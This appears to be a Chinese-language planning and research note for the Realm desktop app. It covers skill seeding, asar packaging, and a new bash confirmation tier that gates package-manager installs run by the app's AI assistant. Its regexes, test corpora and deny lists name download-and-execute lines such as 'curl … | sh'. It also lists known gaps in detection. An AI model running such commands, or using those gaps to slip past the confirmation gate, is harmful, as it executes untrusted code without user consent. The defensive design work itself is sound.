2. **SDK 自己也会跳过点前缀项。** `skills.js:105` `if (entry.name.startsWith(".") || entry.name === "node_modules") continue;` —— 即便没有 Realm 的过滤层也安全（但 Realm 那层会先滤掉并产诊断）。
3. **`skills-builtin/` 源目录里放状态文件更糟** —— 它会随 asar 分发，且 `realm_builtin_src_invalid` 判定会命中（缺 `SKILL.md`）。

**给 planner 的明确结论：** **不要在任何位置引入状态文件。** 若有多余的"版本戳"需求（例如将来要区分"用户改的是哪一版"），那属于 ECO-02（v2 Requirements）的范围，不是本阶段。**本阶段的状态完全由"磁盘内容 vs 随包内容"两个真实来源对比得出，零持久状态。**

### D. 打包与发布（D-12）

#### D-1. `asarUnpack` 与 `files` 缺省行为 —— ✅ 通过解析已构建的 asar 实测

见 **Common Pitfalls → Pitfall 4**（含完整实测数据）。

**直接回答 research_priorities 的两个问题：**

**问题 1：再加 `"skills-builtin/**"` 后 electron-builder 会把它解包到 `app.asar.unpacked/skills-builtin/` 吗？**
**答：会。** [VERIFIED] 既有 `node_modules/nodejieba/**` 实测解包到了 `Realm Nightly.app/Contents/Resources/app.asar.unpacked/node_modules/nodejieba/`，且多层嵌套（`submodules/cppjieba/dict/`、`lib/`、`node_modules/node-addon-api/`）全部展开。`**` 覆盖任意深度的先例已确立。

**问题 2：`files` 未显式 allowlist（当前无 `files` 字段）时 `skills-builtin/` 是否会自动被打进 asar？**
**答：会自动打进。** [VERIFIED]
- `dist/builder-effective-config.yaml` 实测内容含 **`files: []`**（空数组 = 无 allowlist）。
- 解析已构建的 `app.asar` 头部：**顶层条目 59 个**，包含 `AGENTS.md` / `Makefile` / `docs` / `tests` / `test` / `scripts` / `vendor` / `.planning` / `.claude` / `.gsd` / `main.js.bak` 等 —— 即"仓库根可见的一切（除 electron-builder 内建排除项 `dist/`、`.git/`、未用的 devDependencies）"。
- 因此新增的 `skills-builtin/` 目录**必然入包**，无需改 `files`。

**⚠️ 但这同时暴露了 Pitfall 4 的既有泄漏**（`.planning/` 545 文件，含 `PITFALLS.md` 的 `npx` 原文）。**planner 需要显式决定是否一并修**。

#### D-2. `skills-builtin` 的路径解析写法（nodejieba 先例）

**[VERIFIED: favorites-manager.js:287-299 逐字]**

```js
      if (app.isPackaged) {
        const dictDir = path.join(
          process.resourcesPath,
          'app.asar.unpacked', 'node_modules', 'nodejieba', 'submodules', 'cppjieba', 'dict'
        );
        nodejieba.load({
          dict: path.join(dictDir, 'jieba.dict.utf8'),
          ...
        });
      }
```

**注意这个先例的两个特征：** ① `app.isPackaged` 为 **false 时直接不设路径**（走 nodejieba 的默认查找，因为开发态 `node_modules` 就在 `__dirname` 下）；② 路径由 `path.join(process.resourcesPath, 'app.asar.unpacked', ...)` 拼出。

**Realm 版 `skills-builtin` 的等价写法（开发态必须回落 `__dirname`，因为 D-12 明确要求）：**

```js
const path = require('path');

/**
 * 解析随包内置技能源目录（D-12）
 *
 * 打包态：process.resourcesPath/app.asar.unpacked/skills-builtin
 * 开发态：__dirname/skills-builtin（仓库根）
 *
 * 与 favorites-manager.js:287-299 的 nodejieba 分支同构；差异点：nodejieba 在
 * 开发态走默认查找（无需显式路径），而本目录在开发态就在 __dirname 下，必须显式回落。
 *
 * @param {{isPackaged?: boolean, resourcesPath?: string, dirname?: string}} [deps]
 *   依赖注入：默认取 electron 的 app.isPackaged / process.resourcesPath 与 __dirname。
 *   注入是为了让播种模块可在纯 Node 测试里运行（tests/test-agent-workspace.js 的先例）。
 * @returns {string} 随包内置技能源目录的绝对路径
 */
function resolveBuiltinSkillsSrc(deps = {}) {
  const isPackaged = deps.isPackaged !== undefined
    ? deps.isPackaged
    : require('electron').app.isPackaged;
  const resourcesPath = deps.resourcesPath !== undefined
    ? deps.resourcesPath
    : process.resourcesPath;
  const dirname = deps.dirname !== undefined ? deps.dirname : __dirname;

  return isPackaged
    ? path.join(resourcesPath, 'app.asar.unpacked', 'skills-builtin')
    : path.join(dirname, 'skills-builtin');
}
```

**[INFERRED] 为什么"开发态回落 `__dirname`"是对的：** `main.js` 在仓库根，`__dirname` = 仓库根；`skills-builtin/` 也在仓库根。开发态 `app.isPackaged === false` → 走 `path.join(__dirname, 'skills-builtin')` → 命中。

**[ASSUMED] 一个需要实测验证的点：** 打包态下 `require('electron').app.isPackaged` 在**模块顶层求值**与**函数内求值**是否都可用 —— `app` 在 `app.whenReady()` 之前即可用（Electron 的 `app` 对象在模块加载时就存在，只有部分方法要求 ready 后）。`favorites-manager.js` 是先例（在函数内读 `app.isPackaged`，且该函数在启动后才被调用）。**建议同样在函数内求值**（惰性），避免模块顶层就 require electron 而破坏纯 Node 测试。**上面的写法已经把 electron 的 require 放进函数体，符合这一点。**

#### D-3. `make install` 的验证步骤与安全纪律

**`make install` 做了什么（[VERIFIED: Makefile:14-18 逐字]）：**

```make
install:
	npx electron-builder --mac dir
	rm -rf "$(INSTALL_DIR)/$(APP_NAME).app"
	cp -R "$(APP_PATH)" "$(INSTALL_DIR)/$(APP_NAME).app"
	@echo "已安装到 $(INSTALL_DIR)/$(APP_NAME).app"
```

`APP_PATH := dist/mac-arm64/Realm.app`、`INSTALL_DIR := /Applications`、`APP_NAME := Realm`。

**🚨 安全纪律（必须作为计划里的独立 checkpoint，不可合并进"验证"步骤）：**

**[VERIFIED: 本机实测 `pgrep -fl "Realm"`]** 当前**正在运行** `/Applications/Realm.app`：

```
25922 /Applications/Realm.app/Contents/MacOS/Realm                          ← 主进程
21896 /Applications/Realm.app/Contents/Frameworks/Realm Helper (Renderer)...  --user-data-dir=~/Library/Application Support/realm
22229 /Applications/Realm.app/Contents/Frameworks/Realm Helper... (VideoCaptureService)
26519 /Applications/Realm.app/Contents/Frameworks/Realm Helper... (gpu-process)
26520 /Applications/Realm.app/Contents/Frameworks/Realm Helper... (NetworkService)
26654 /Applications/Realm.app/Contents/Frameworks/Realm Helper (Renderer)...
... （共 10 条匹配，全部 user-data-dir=~/Library/Application Support/realm）
```

**这意味着：现在跑 `make install` 会 `rm -rf` 掉用户正在使用的 app bundle。**

AGENTS.md 的安全纪律原文（[VERIFIED: AGENTS.md 发布前必查小节]）：

> - **发布前验证**：`make install` 装出 .app 后**实际启动一次**（不是只跑 dev），确认无原生崩溃再发布。启动闪退看 `~/Library/Logs/DiagnosticReports/Realm-*.ips`

以及 memory 中记录的历史事故：**「验证 `/Applications` 正式 .app 前先 `pgrep` 查用户实例；清理只按自身 PID，路径模式 `pkill` 曾误杀生产版。」**

**建议的验证流程（拆成必须顺序执行的三步）：**

```
Step 0（阻塞 checkpoint，人因）：
  pgrep -fl "Realm"
  若有输出 → 停下，请用户自行退出 Realm；不要代劳 kill。

Step 1（构建 + 安装 Nightly，避开用户的正式版）：
  make install-nightly
  → 装到 /Applications/Realm Nightly.app（独立 appId + 独立 userData realm-nightly）

Step 2（验证播种成功 —— 三种可查证据）：
  ① 检查 asar 解包目录（构建期证据）：
     ls -la "/Applications/Realm Nightly.app/Contents/Resources/app.asar.unpacked/skills-builtin/"
     → 应见 find-skills/ 与 skill-creator/
  ② 启动 Nightly 版，等主窗口出现，然后检查播种产物（运行期证据）：
     ls -la ~/Library/Application\ Support/realm-nightly/agent-workspace/managed-skills/
     → 应见 find-skills/ 与 skill-creator/，且各含 SKILL.md
  ③ 逐文件比对（幂等 + 完整性证据）：
     diff -r "…/app.asar.unpacked/skills-builtin/skill-creator" \
             ~/Library/Application\ Support/realm-nightly/agent-workspace/managed-skills/skill-creator
     → 应无差异输出（播种是整目录复制）

Step 3（幂等验证）：
  再次启动 Nightly → 再查 ② → 目录仍在、内容一致、无重复播种痕迹
  （注：因 D-08 是无条件覆盖，第二次启动会重写 ← 这是预期；
    验证点是"没有多出 find-skills-2/"、"_cache.diagnostics 里没有 error"）

Step 4（清理，只按自身 PID）：
  记录启动的 PID → kill <该 PID>；不要 pkill -f "Realm"（会误杀用户的正式版）
```

**[ASSUMED]** `make install-nightly` 用的是 `--config.productName="Realm Nightly"` + `--config.appId=com.realm.browser.nightly` + 独立图标（[VERIFIED: Makefile:21-30]），但它**没有**独立 `asarUnpack` 配置 —— 因为 asarUnpack 来自 `package.json` 的 `build`，命令行 `--config.*` 只覆盖指定的键。所以 `skills-builtin/**` 会被同样解包。**这一点需要在实跑时确认**（若 Nightly 构建未解包，说明 `--config` 覆盖了整个 `build` 对象 —— 那就要退回用 `make install` + Step 0 的主进程停止）。

### E. bash install 档（D-13..D-16，SEC-01 门禁）

#### E-1. `PACKAGE_MANAGER_INSTALL_PATTERNS` 精确模式建议

**实测方法：** 构造 **33 正例 + 34 反例 + 15 逃逸向量 + 39 真实开发命令**语料，跑两版候选实现对比（`/tmp/proto-install.js`、`/tmp/proto-install2.js`、`/tmp/proto-install3.js`）。

**✅ 建议落地的表（实测定型，正例 0 漏检 / 反例 0 误伤 / 逃逸剩 1 已知缺口）：**

```js
/**
 * 包管理器安装模式表（SEC-01 / D-13 / D-14 / D-16）
 *
 * 与 DANGEROUS_PATTERNS 平行但语义分离：
 * - DANGEROUS_PATTERNS  = 本机破坏性操作（rm / sudo / chmod ...）
 * - PACKAGE_MANAGER_INSTALL_PATTERNS = 从网络获取并执行第三方代码
 *   （安装生命周期会执行依赖的 postinstall 脚本 → 实质是任意代码执行）
 *
 * 匹配口径（必须与 DANGEROUS_PATTERNS 一致）：对 normalizeSegment 后的**整段**做匹配。
 * 用 \b 词边界（而非 (^|\s)）是为了覆盖 "'npm' i x" 这类引号包裹的命令名 ——
 * 命令首 token 的引号由 stripLeadingQuotes 归一化剥掉（见下）。
 *
 * 旗标容忍 (\s+-\S+)* 让 `npm -g i x` / `npm --global install x` 也被覆盖；
 * 已知缺口（写进文档诚实边界）：`npm --prefix /tmp i x` 这类**取值旗标**不覆盖。
 */
const PACKAGE_MANAGER_INSTALL_PATTERNS = [
  { pattern: /\bnpx\b/,                                        name: '包执行器（npx）' },
  { pattern: /\bnpm\b(?:\s+-\S+)*\s+\b(i|install|ci|exec|add)\b/,      name: 'npm 安装依赖' },
  { pattern: /\bpnpm\b(?:\s+-\S+)*\s+\b(add|install|i|dlx|exec)\b/,    name: 'pnpm 安装依赖' },
  { pattern: /\byarn\b(?:\s+-\S+)*\s+\b(add|install|dlx|exec)\b/,      name: 'yarn 安装依赖' },
  { pattern: /\bbun\b(?:\s+-\S+)*\s+\b(add|install|x|i)\b/,            name: 'bun 安装依赖' },
  { pattern: /\bpip3?\b(?:\s+-\S+)*\s+install\b/,                      name: 'pip 安装包' },
  { pattern: /\bpython3?\b(?:\s+-\S+)*\s+-m\s+pip\s+install\b/,        name: 'python -m pip 安装包' },
  { pattern: /\buv\b(?:\s+-\S+)*\s+(pip\s+install|add|tool\s+install|sync)\b/, name: 'uv 安装包' },
  { pattern: /\buvx\b/,                                        name: 'uv 包执行器（uvx）' },
  { pattern: /\bbrew\b(?:\s+-\S+)*\s+(install|upgrade|reinstall)\b/,   name: 'Homebrew 安装包' },
  { pattern: /\bcargo\b(?:\s+-\S+)*\s+install\b/,                      name: 'cargo 安装包' },
  { pattern: /\bgo\b(?:\s+-\S+)*\s+install\b/,                         name: 'go 安装包' },
  { pattern: /\bgem\b(?:\s+-\S+)*\s+install\b/,                        name: 'gem 安装包' },
];

/**
 * 命令首 token 的引号剥离（匹配前归一化，零副作用）
 * "'npm' i x" → "npm i x"；"\"pip3\" install x" → "pip3 install x"
 * 不匹配引号后跟非命令字的形态（避免破坏 echo "npm install" 这类字面量 —— 见已知误报）
 */
function stripLeadingQuotes(seg) {
  return normalizeSegment(seg).replace(/^(['"])([A-Za-z][\w.-]*)\1/, '$2');
}

/**
 * 判定单个命令段是否为包管理器安装
 * @param {string} seg - 命令段（原始文本即可，内部会归一化）
 * @returns {string|null} 命中返回安装档名称（中文），未命中返回 null
 */
function matchInstall(seg) {
  const n = stripLeadingQuotes(seg);
  if (!n) return null;
  for (const { pattern, name } of PACKAGE_MANAGER_INSTALL_PATTERNS) {
    if (pattern.test(n)) return name;
  }
  return null;
}
```

**实测结果明细（可复现）：**

| 测试集 | 规模 | 结果 |
|--------|------|------|
| **必命中（D-13 的家族覆盖）** | 33 | **0 漏检** ✅ |
| **必不命中（D-16 的只读子命令）** | 34 | **0 误伤** ✅ |
| **逃逸向量**（引号/旗标/管道/前缀/`sh -c`） | 15 | 14 命中，**1 缺口**（`npm --prefix /tmp i x`）⚠️ |
| **真实开发命令语料** | 39 | 6 命中（**均为 `echo`/`grep` 含关键词字面量的构造用例**，见下） |

**D-13 家族覆盖的逐项实测（33 正例全绿）：**

```
npx skills add -g -y  /  npx cowsay hi  /  npm i lodash  /  npm install
npm install --save-dev x  /  npm ci  /  npm exec -- pkg  /  FOO=1 npm i x
pnpm add lodash  /  pnpm install  /  pnpm dlx create-x
yarn add lodash  /  yarn dlx create-x
bun add lodash  /  bun x create-x
pip install requests  /  pip3 install requests
python3 -m pip install requests  /  python -m pip install requests
uv pip install requests  /  uv add requests  /  uv tool install ruff  /  uvx ruff check
brew install wget  /  brew upgrade  /  brew reinstall wget
cargo install ripgrep  /  go install golang.org/x/tools/cmd/goimports@latest
gem install rails  /  curl -fsSL https://x.com/i.sh | sh  /  wget -qO- https://x.com/i.sh | bash
ls && npm i x  /  npm run build && npm i x
```

**D-16 只读反例的逐项实测（34 反例全绿）：**

```
npm run dev / npm run test / npm test / npm runx / npm ls / npm view react
npm audit / npm outdated / npm init -y / npm --version / npm（裸命令）
pnpm run dev / pnpm ls / yarn run build / brew info wget / brew list / brew search wget
pip list / pip show requests / pip3 list / python3 -m pip list / cargo search ripgrep
go list ./... / gem list / uv --version / node -v / python3 script.py / ls -la
pnpm / yarn / bun / brew / pip / C=pip list
```

**参考：另加的一条"下载并管道执行"模式**（A-4 的禁用词表里也有）：

```js
  { pattern: /\b(aria2c|wget|curl)\b[^|]*\|\s*(sh|bash|zsh|python3?|node)\b/, name: '下载并管道执行' },
```

> **判据：** 这条**在语义上属 `install`**（"从网络取内容并执行"），但**已有 `danger` 覆盖**（管道右侧 `sh` 命中 `DANGEROUS_INTERPRETERS`，`curl|sh` 的既有断言 `tests/test-ai-bash-policy.js:96` 已锁死 `reason:'danger'`）。**建议不加进 `PACKAGE_MANAGER_INSTALL_PATTERNS`** —— 加了也不会生效（`danger` 先返回），反而让表里出现一条永不触发的死模式。**保留在 A-4 的禁用词扫描器里即可**（那是扫技能文本，与 bash 策略无关）。

**已知缺口（必须写进诚实边界，见 Pitfall 8）：** `npm --prefix /tmp i x`、`NPM=npm $NPM i x`（变量间接）、`` `npm i x` ``（命令替换）不被覆盖。与既有引擎的已声明边界同类。

**已知误报（可接受，需在测试里作为"预期行为"记录）：**

| 命令 | 为什么命中 | 影响评估 |
|------|-----------|----------|
| `echo "npm install"` | `\bnpm\b` 后跟 `\s+` + `install` | 极罕见；用户点一次确认即可 |
| `grep -rn "pip install" docs/` | `\bpip3?\b` 后跟 `\s+install` | 同上 |
| `echo npx` / `echo uvx` | `\bnpx\b` / `\buvx\b` 无锚 | 同上；`(^|\s)` 写法也会命中 |
| `npm ci --dry-run` | 子命令是 `ci` | 同上；`--dry-run` 不实际安装，但确认一次无成本 |

> **为什么接受误报：** D-16 担心的误报是 **`npm run <x>` 这类高频日常命令**（会驱动用户把 `npm` 整个加入白名单）。实测这 4 条误报**都不属于**那一类 —— 它们是"命令里恰好含有这个字符串"，实际开发中极少。**这是"降低误执行概率"的启发式，向安全侧倾斜是对的。**

#### E-2. `evaluateBashCommand` 的插入点与调用面

**插入点：** 见 **Architecture Patterns → Pattern 3**（完整新函数形状）。

**调用面（[VERIFIED: repo-wide grep，排除 node_modules 与 .claude/worktrees]）：**

| 位置 | 类型 | 影响 |
|------|------|------|
| **`ai-manager.js:5647`** | **唯一的生产调用点** | `bashPolicy.evaluateBashCommand(params && params.command, whitelist)` |
| `main.js:1375` | 调 `validateWhitelistList`（**不是** `evaluateBashCommand`） | 零影响 |
| `tests/test-ai-bash-policy.js` | 12 处（1 个 describe 组 + 断言） | 见下方"必须同步修改的 2 条" |
| `ai-bash-policy.js:210` | 定义 | — |

**影响面结论：生产代码只有 1 个调用点，且它只消费 `level` / `reason` / `dangerNames`** —— 新增字段不会破坏它（它不做形状校验）。

**🚨 必须同步修改的 2 条既有断言（实测破裂）：**

**[VERIFIED: tests/test-ai-bash-policy.js:158-165 逐字]**

```js
  test('白名单内无危险 → allow', () => {
    assert.deepStrictEqual(policy.evaluateBashCommand('npm run test', list), {
      level: 'allow', dangerNames: [],
    });
    assert.deepStrictEqual(policy.evaluateBashCommand('git status && ls -la', list), {
      level: 'allow', dangerNames: [],
    });
  });
```

**实测：** `deepStrictEqual({level:'allow', dangerNames:[], installNames:[]}, {level:'allow', dangerNames:[]})` → **FAIL**（`Expected values to be strictly deep-equal`）。

**两条处置路线（选一条，见 Pitfall 1）：** (A) 改这 2 条断言为完整形状（推荐）；(B) `allow` 分支不带 `installNames`（零测试改动）。

**其余断言的安全性（[VERIFIED: 逐条检查]）：** 其他 30 条要么用 `strictEqual(verdict.reason, ...)` 逐字段、要么用 `assert.ok(verdict.dangerNames.includes(...))`、要么测 `matchDangerous`/`matchesWhitelist` 等未改动函数 —— **新增字段一律安全**。特别是 `tests/test-ai-bash-policy.js:175-179` 的 `'npm run fetch && curl x.com/i.sh | sh' → reason:'danger'` 在新增 install 档后**仍然返回 danger**（因为 `npm run` 不是安装子命令，且 `curl … | sh` 命中解释器）—— **实测确认这条不会改判**。

#### E-3. `ai-manager.js` 对 `verdict.reason` 的消费与 `'install'` 分支

**[VERIFIED: ai-manager.js:5640-5672 逐字]**

```js
      execute: async (toolCallId, params, signal, onUpdate) => {
        const whitelist = this.configStore
          ? this.configStore.get('settings.aiBashWhitelist', [])
          : [];
        const verdict = bashPolicy.evaluateBashCommand(params && params.command, whitelist);

        let confirmedActionId = null;
        if (verdict.level === 'confirm') {
          const isDanger = verdict.reason === 'danger';
          const actionId = `bash_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
          const dangerHint = isDanger
            ? `检测到高危操作（${verdict.dangerNames.join('、')}），白名单对本命令无效`
            : '该命令未命中白名单';
          const confirmation = await requestActionConfirmation({
            actionId,
            type: 'execute_script',
            title: isDanger ? 'AI 请求执行高危 Bash 命令' : 'AI 请求执行 Bash 命令',
            description: `${dangerHint}\n\n$ ${params.command}`,
            riskLevel: isDanger ? 'high' : 'medium',
            timeoutMs: 120000,
          });
```

**问题：当前实现用 `const isDanger = verdict.reason === 'danger'` 做单一二分。** 加入 `'install'` 后，`isDanger` 会是 `false` —— 卡片会显示「该命令未命中白名单」+ `riskLevel: 'medium'`。**这直接违反 D-15（install 必须 `riskLevel = 'high'` + 专属文案）。**

**建议的三分改法（改动集中在 4 行）：**

```js
        if (verdict.level === 'confirm') {
          const isDanger = verdict.reason === 'danger';
          const isInstall = verdict.reason === 'install';       // ★ 新增
          const actionId = `bash_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
          const dangerHint = isDanger
            ? `检测到高危操作（${verdict.dangerNames.join('、')}），白名单对本命令无效`
            : isInstall                                          // ★ 新增分支
              ? `检测到包管理器安装（${verdict.installNames.join('、')}）：`
                + '将从网络下载并运行第三方代码；该命令不会因为加入白名单而免确认'
              : '该命令未命中白名单';
          const confirmation = await requestActionConfirmation({
            actionId,
            type: 'execute_script',
            title: isDanger
              ? 'AI 请求执行高危 Bash 命令'
              : isInstall
                ? 'AI 请求安装第三方软件包'                       // ★ 新增
                : 'AI 请求执行 Bash 命令',
            description: `${dangerHint}\n\n$ ${params.command}`,
            riskLevel: (isDanger || isInstall) ? 'high' : 'medium',   // ★ 改
            timeoutMs: 120000,
          });
```

**同时要改的还有工具描述（`ai-manager.js:5637-5641`，逐字现状）：**

```js
    const inner = this._adaptHarnessTool(this._sdkFileTools.createBashTool(), {
      label: '执行 Bash 命令',
      description: `在 AI 工作区（${workspaceDir}）内执行 bash 命令，工作目录固定为工作区根目录。`
        + '输出超过 2000 行或 50KB 会截断（全量输出存临时文件）。'
        + '命中白名单的命令自动执行；其余命令需用户在确认卡片上确认；'
        + '危险命令（rm/sudo/kill 等）即使加入白名单也必须确认。'
        + '命令失败（非零退出码、超时）会直接报错，可用较短超时试探性执行',
    });
```

**建议把第 3 句改成：** `'危险命令（rm/sudo/kill 等）与包管理器安装命令（npx/npm i/pip install/brew install 等）即使加入白名单也必须确认。'`

**理由：** 工具描述是模型看到的**唯一策略说明**。若不告诉模型"install 档存在"，模型会把"被强制确认"理解为随机行为，可能反复重试（既有取消文案已要求"不要反复重试"，但描述层没给模型理由）。

**`'empty'` 分支的影响：** 现有实现把 `reason` 不是 `'danger'` 的都归到"未命中白名单"。加 install 后 `'empty'` 仍走该分支 —— **无需改**（空命令本来就是"未命中白名单"的语义）。

#### E-4. 现有测试的组织方式与新增测试清单

**组织方式（[VERIFIED: tests/test-ai-bash-policy.js，222 行）：** 6 个 `describe` 组、32 个 `test`：

| describe 组 | 行范围 | 覆盖函数 |
|-------------|--------|----------|
| `splitCommandPipeline 引号感知拆段` | :15-43 | `splitCommandPipeline` |
| `extractCommandName 命令名提取` | :45-65 | `extractCommandName` |
| `matchDangerous 危险命令判定` | :67-107 | `matchDangerous` |
| `matchesWhitelist 白名单匹配` | :110-153 | `matchesWhitelist` |
| `evaluateBashCommand 三档裁决` | :155-203 | `evaluateBashCommand` |
| `validateWhitelistList 白名单列表校验` | :205-222 | `validateWhitelistList` |

**命名约定：** 中文短句描述行为，如 `test('白名单内但含危险段 → confirm/danger（白名单失效）')`。断言风格：`assert.strictEqual(verdict.level, 'confirm')` + `assert.strictEqual(verdict.reason, 'danger')` 逐字段（**只有 allow 那两条用了全对象 `deepStrictEqual`**）。

**建议新增的测试（两个新 describe 组）：**

```js
describe('matchInstall 包管理器安装判定（SEC-01 / D-13 / D-16）', () => {
  // —— 必命中：D-13 家族覆盖（33 例）——
  test('npx 任意形态命中', ...);              // npx / npx pkg / npx skills add -g -y
  test('npm 安装子命令命中', ...);            // i / install / ci / exec / add / install --save-dev x
  test('pnpm / yarn / bun 安装子命令命中', ...);  // add / install / dlx / exec / x
  test('pip / pip3 / python -m pip 命中', ...);
  test('uv / uvx 命中', ...);                 // uv pip install / uv add / uv tool install / uvx
  test('brew / cargo / go / gem 安装命中', ...);
  test('环境变量前缀形态命中', ...);           // FOO=1 npm i x
  test('旗标前置形态命中', ...);               // npm -g i pkg / npm --global install x
  test('引号包裹命令名命中', ...);             // 'npm' i x / "pip3" install x

  // —— 必不命中：D-16 只读反例（34 例，反例断言是硬要求）——
  test('npm 只读子命令不命中', ...);           // run / test / ls / view / audit / outdated / init / --version
  test('pnpm / yarn 只读子命令不命中', ...);    // run / ls
  test('brew 只读子命令不命中', ...);          // info / list / search
  test('pip 只读子命令不命中', ...);           // list / show
  test('cargo / go / gem 只读子命令不命中', ...); // cargo search / go list / gem list
  test('裸命令名不命中', ...);                 // npm / pnpm / yarn / bun / brew / pip（无子命令）
  test('近似串不误伤', ...);                   // npm runx（npm\s+ 要求空格，故不命中）
});

describe('evaluateBashCommand install 档短路（SEC-01 / D-14）', () => {
  test('install 命中且在白名单内 → confirm/install（白名单不可越过）', ...);
    // 关键：whitelist = ['npm *'] 或 ['npm']，命令 'npm i x' → 必须 confirm/install
  test('白名单内只读命令仍 allow（反例，防误伤）', ...);
    // whitelist = ['npm run *']，命令 'npm run test' → allow（既有行为不变）
  test('danger 优先于 install', ...);
    // 'sudo npm i x' → reason:'danger'（不是 'install'）
  test('复合命令一段命中 install 即整体 confirm/install', ...);
    // 'ls && npm i x' → confirm/install
  test('管道右侧命中 install', ...);           // 'echo y | npm i x' → confirm/install
  test('installNames 收集全部命中段', ...);
    // 'npm i a && pip install b' → installNames 含两个
  test('allow 分支形状（含 installNames）', ...);  // ← 若采用路线 (A)，此断言替代原两条
});
```

**加上 A-4 的禁用词扫描测试（若采纳"二段式"建议）：**

```js
describe('内置技能零安装语义（SEED-03 / P1 门禁）', () => {
  test('两个 SKILL.md 全文零禁用词', ...);       // 无豁免，硬断言
  test('两个 LICENSE.txt 零禁用词', ...);        // 同上
  test('scripts/ 与 resources/ 仅命中豁免清单内的行', ...);  // 带显式豁免（check_env.mjs 的禁止安装文案）
  test('不存在 npx skills 的任意变体', ...);     // 对 PITFALLS P1 的靶心做专项断言
});
```

### F. 文档同步（DOC-02）与许可证归属（P10）

#### F-1. `docs/product/ai-skills.md` 的现状与新增章节位置

**[VERIFIED: `grep -n "^#\{1,3\} " docs/product/ai-skills.md`]** 现有结构（9,511 字节）：

```
  1: # AI 助手技能（Skill）（产品说明）
 20: （诊断形状对照表 —— 无标题，在「一、能力」前的引用块里）
 28: ## 一、能力
 36: ## 二、双目录
 51: ## 三、优先级
 57: ## 四、限额
 71: ## 五、沙箱边界
 78: ## 六、已知限制
 88: ## 七、测试与验证
```

**注意：CONTEXT 的 research_priorities 说"现有七节结构（一、能力…七、测试与验证）"，实测确认 7 节；但 `§五 沙箱边界` 已经写了「技能不构成额外权限」（第 73 行附近），`§六 已知限制` 已经写了 `allowed-tools` 那段。** 这意味着 DOC-02 对 `ai-skills.md` 的要求**不是新增"技能不构成额外权限"**（已经有了），而是**新增两个章节**：

**建议新增位置与要点：**

| 新章节 | 建议插入位置 | 内容要点 |
|--------|--------------|----------|
| **`## 八、内置技能`**（或插在「二、双目录」之后作为 `## 二·五`） | 建议插在**「七、测试与验证」之前**（编号顺延为八），因为它是"能力描述"而非"验证说明" | ① 随包分发的两个技能（find-skills 改写版 / skill-creator 上游版）与各自的许可证；② **自愈式播种语义**：每次启动按单技能目录粒度无条件覆盖 `managed-skills/<name>/`；③ **seeded 身份来源**：扫随包 `skills-builtin/` 的目录名集合（非状态文件、非目录位置）；④ **不能删改，只能禁用**（`settings.aiSkills.disabled`）；⑤ 用户定制内置技能的正确通道是 `skills/` 同名遮蔽；⑥ **零安装语义**：find-skills 只输出候选清单，安装入口在设置页 |
| **`## 九、bash 包管理器安装档`** | 紧随内置技能章 | ① 独立于 danger 档的第四档（或"第三档的第二个子类"——需与现有"三档"表述调和，见下）；② 覆盖的包管理器家族清单；③ **白名单不可越过**；④ `riskLevel = high` 与专属文案；⑤ **脚本执行的确认成本**：技能自带 `scripts/` 运行时会弹确认卡片（`node`/`python3` 命中 `DANGEROUS_INTERPRETERS`），这是 SKILL-09「零新增权限机制」的必然结果 |

**⚠️ 一个必须处理的表述冲突：** 现有 §五 已写「bash 的三档权限（白名单 → 默认确认 → 危险强制确认）」—— **加上 install 档后怎么表述？** 两条路线：
- **(i) 改称"四档"**：`① 免确认 ② 默认确认 ③ 危险强制确认 ④ 安装强制确认`。**代价**：`docs/product/ai-agent-workspace.md` §四（标题就是「bash：三档权限」）也要一起改，且 Phase 46 的 `46-VALIDATION.md` 等历史文档里"三档"的字面会不一致。
- **(ii) 保持"三档"框架，install 说明为"③ 强制确认"的第二个触发源。** 即：`③ 强制确认（危险命令表 或 包管理器安装表）`。**代价**：概念上 `install` 与 `danger` 被并列在同一个"档"里，与 D-14 的"平行但语义分离"表述有张力，但**档位数量不变**。

**推荐 (ii) 的变体**：文档里写「**强制确认档（第三档）有两个互不包含的触发源：危险命令表（本机破坏）与包管理器安装表（网络取第三方代码）**」。理由：档位数量不变 → 不必改 `ai-agent-workspace.md` §四的标题与其他历史文档；同时"两个触发源语义分离"完整表达了 D-14。**但注意 D-15 要求 install 的 `riskLevel = 'high'` —— 而现有 §四 的"默认确认（中风险）"与"强制确认（高风险）"是分开列的，所以 install 归入第三档在 riskLevel 上是自洽的。**

#### F-2. `docs/product/ai-agent-workspace.md` 的改动点

**[VERIFIED: `docs/product/ai-agent-workspace.md` 8,414 字节]** 结构：

```
 1: # AI 工作区与文件/Bash 工具（产品说明）
 9: ## 一、功能概述
27: ## 二、agent 工作区目录模型
48: ## 三、read / write / edit：硬沙箱（无确认，路径锁死）
61: ## 四、bash：三档权限（路径不设防，操作必过人）
75: ## 五、白名单（设置页 → AI 助手 → AI Bash 命令白名单）
82: ## 六、确认卡片行为
89: ## 七、安全边界（诚实声明）
96: ## 八、测试与验证
```

**需要改写的具体段落：**

**① §四（第 61-74 行）—— 三档表格与危险命令表段落**

现有逐字：

```
| 档 | 判定 | 结果 |
|----|------|------|
| ① 免确认 | 所有段命中白名单 | 自动执行 |
| ② 默认确认 | 未命中白名单 | 弹确认卡片（中风险），卡片完整展示命令原文 |
| ③ 强制确认 | 任一段命中危险命令表 | 弹确认卡片（高风险），**加入白名单也无效** |
```

**建议改为：**

```
| 档 | 判定 | 结果 |
|----|------|------|
| ① 免确认 | 所有段命中白名单 | 自动执行 |
| ② 默认确认 | 未命中白名单 | 弹确认卡片（中风险），卡片完整展示命令原文 |
| ③ 强制确认 | 任一段命中**危险命令表**或**包管理器安装表** | 弹确认卡片（高风险），**加入白名单也无效** |

**强制确认档的两个触发源（互不包含）：**

- **危险命令表** —— 语义是「**本机破坏性操作**」：rm 全系、sudo、su、dd/mkfs、kill/killall/pkill、shutdown/reboot/halt、hdiutil/diskutil/launchctl 等系统配置工具、chmod/chown/chflags、defaults write、重定向覆盖系统路径（`> /非tmp`），以及把任意文本当代码执行的解释器（sh/bash/zsh/eval/source/osascript/python/node/ruby/perl）。
- **包管理器安装表** —— 语义是「**从网络获取并执行第三方代码**」：`npx`、`npm i|install|ci|exec`、`pnpm add|install|dlx`、`yarn add|install|dlx`、`bun add|install|x`、`pip[3] install`、`python[3] -m pip install`、`uv pip install|add|tool install`、`uvx`、`brew install|upgrade|reinstall`、`cargo install`、`go install`、`gem install`。**理由是安装生命周期会执行依赖的 `postinstall` 脚本 —— 实质是任意代码执行，与 `rm` 同级。** 只读子命令（`npm run|test|ls|view|audit|outdated`、`brew info|list|search`、`pip list|show` 等）**不在此表内**。
```

